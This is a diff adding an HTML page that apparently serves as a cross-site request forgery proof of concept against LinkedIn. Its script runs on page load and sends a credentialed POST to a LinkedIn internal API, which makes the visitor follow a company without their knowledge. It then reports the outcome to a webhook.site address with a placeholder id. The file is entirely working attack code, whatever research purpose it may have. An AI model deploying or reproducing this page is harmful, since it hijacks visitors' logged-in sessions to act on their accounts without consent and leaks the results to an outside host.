@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <script>
+    fetch("https://www.linkedin.com/voyager/api/feed/dash/followingStates/urn:li:fsd_followingState:urn:li:fsd_company:9372578", {
+      method: "POST",
+      credentials: "include",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        patch: {
+          $set: {
+            following: true
+          }
+        }
+      })
+    })
+    .then(response => {
+      console.log("LinkedIn fetch status:", response.status);
+      fetch("https://webhook.site/your-id?status=" + response.status);
+    })
+    .catch(error => {
+      console.error("LinkedIn fetch failed:", error);
+      fetch("https://webhook.site/your-id?error=" + encodeURIComponent(error.message));
+    });
+  </script>
+</body>
+</html>
